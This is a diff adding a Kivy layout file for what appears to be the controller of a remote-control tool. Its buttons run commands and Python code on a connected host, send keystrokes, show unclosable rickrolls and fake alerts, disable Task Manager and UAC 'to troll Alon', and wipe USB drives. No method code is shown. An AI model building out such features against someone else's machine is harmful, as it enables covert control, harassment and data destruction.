@@ -1,0 +1,219 @@
+#:kivy 2.0.0
+
+
+<MyGrid>:
+    name:'MyGrid'
+    ScrollView:
+
+        GridLayout:
+            cols:1
+            size: root.width, root.height
+
+            GridLayout:
+                cols:2
+
+                Label:
+                    text: "Host ip (must refer to \nipv4, run command\nipconfig): "
+
+                TextInput:
+                    id: hip
+                    multinline:False
+
+            Button:
+                text:"connect"
+                on_press: app.btn()
+            Button:
+                text:'disconnect'
+                on_press: app.disconnect_on_first_screen()
+            
+            TextInput:
+                id:command
+                multinline:True
+            Button:
+                text:"run command"
+                on_press:app.system_command()
+
+            TextInput:
+                id:runp
+                multinline:True
+            Button:
+                text: "Run Program"
+                on_press: app.run_program()
+
+            TextInput:
+                id: openl
+                multinline:True
+
+            Button:
+                text: "open link on chrome"
+                on_press: app.open_link_on_chrome()
+
+
+                
+            GridLayout:
+                cols: 4
+                
+                TextInput:
+                    id: KeyboardInput_one
+                    multinline: False
+
+                TextInput:
+                    id: KeyboardInput_two
+                    multinline: False
+
+                TextInput:
+                    id: KeyboardInput_three
+                    multinline: False
+
+                TextInput:
+                    id: KeyboardInput_four
+                    multinline: False
+            
+            Button:
+                text: "press"
+                on_press: app.keyboard()
+            GridLayout:
+                cols:2
+
+                Button:
+                    text: "type"
+                    on_press: app.ktype()
+
+                TextInput:
+                    id: ktype
+                    multinline:True
+                
+                TextInput:
+                    id: click_pos_x
+                    multinline:True
+
+                TextInput:
+                    id: click_pos_y
+                    multinline:True
+            Button:
+                text: "click"
+                on_press: app.click()
+            GridLayout:
+                cols:2
+                Button:
+                    text:"custom"
+                    on_press: app.custom()
+                Button:
+                    text:"more"
+                    on_press: app.more()
+
+<Custom>:
+    GridLayout:
+        cols: 1
+        Button:
+            text:"Run Moti"
+            on_press:app.run_moti()
+        GridLayout:
+            cols:2
+            TextInput:
+                id:id
+            TextInput:
+                id:videourl
+        Button:
+            text:"Register"
+            on_press:app.register_video()
+        GridLayout:
+            cols:2
+            TextInput:
+                id:title
+            TextInput:
+                id:idtp
+        Button:
+            text:"Play Registered\n Video"
+            on_press:app.play_registered_video()
+        GridLayout:
+            cols:2
+            Button:
+                text:"black screen"
+                on_press:app.blackscreen()
+            TextInput:
+                id:bss
+        TextInput:
+            id: code
+            multinline: True
+        Button:
+            text:"run python code"
+            on_press: app.send_code()
+        TextInput:
+            id: codegiopty
+            multinline: True
+        Button:
+            text:"run giopty code (alpha)"
+            on_press: app.send_code_giopty()
+        Button:
+            text:"add custom python command (alpha)"
+            on_press: app.add_custom_python()
+        Button:
+            text:"add custom giopty command (alpha)"
+            on_press: app.add_custom_giopty()
+        Button:
+            text:"open custom commands (alpha)"
+            on_press: app.open_custom_commands()
+        TextInput:
+            id:RickrollTitle
+            multinline: True
+        Button:
+            text:"(Almost) Unclosable Rickroll"
+            on_press:app.rickroll()
+        Button:
+            text:"Rickroll Music Only"
+            on_press:app.onlymusicrickroll()
+        GridLayout:
+            cols:2
+            TextInput:
+                id:WindowsAlertTitle
+                multinline:True
+            TextInput:
+                id:WindowsAlertText
+                multinline:True
+        Button:
+            text:"Windows Alert"
+            on_press:app.windowsalert()
+        Button:
+            text:"back"
+            on_press: app.back_from_custom()
+
+<more>:
+    GridLayout:
+        cols:1
+        Button:
+            text:"Enable UAC\nto troll Alon"
+            on_press:app.enableuac()
+        Button:
+            text:"Enable task manager\nto troll Alon"
+            on_press:app.enabletaskmanager()
+        TextInput:
+            id:ttstext
+            multinline:True
+        Button:
+            text:"Text to speech"
+            on_press:app.tts()
+        GridLayout:
+            cols:2
+            TextInput:
+                id:ptdname
+            TextInput:
+                id:ptdindex
+        Button:
+            text:"Disable program"
+            on_press:app.enablep()
+        Button:
+            text:"Enable index"
+            on_press:app.disablep()
+        Button:
+            text:"enable file deletion"
+            on_press:app.efd()
+        Button:
+            text:"disable file deletion"
+            on_press:app.dfd()
+        Button:
+            text:"USB drive wiper"
+            on_press:app.udw()
+        Button:
+            text:"back"
+            on_press: app.back_from_more()
